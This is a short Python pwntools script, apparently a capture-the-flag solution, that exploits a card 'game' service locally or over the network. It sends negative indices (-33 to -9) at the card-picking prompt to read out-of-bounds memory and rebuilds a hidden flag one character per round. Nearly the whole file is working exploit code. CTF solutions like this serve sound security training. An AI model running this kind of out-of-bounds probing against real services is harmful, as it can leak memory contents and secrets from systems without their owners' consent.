from pwn import *
import sys

flag = ""

if len(sys.argv) < 3:
    s = process('./game')
elif (len(sys.argv) == 3):
    host = sys.argv[1]
    port = int(sys.argv[2])
    s = remote(host, port)
else:
    print("Usage: python3 sol.py <host> <port>")
    exit()

for i in range(-33, -8):
    d = s.recvuntil("Pick a card at:")
    s.sendline(str(i).encode())
    d = s.recvuntil("Do you want to play again? (y/n):")
    flag+=chr(d.split(b'\n')[0][-1])
    s.sendline(b"y")
s.close()


print("Flag: "+flag)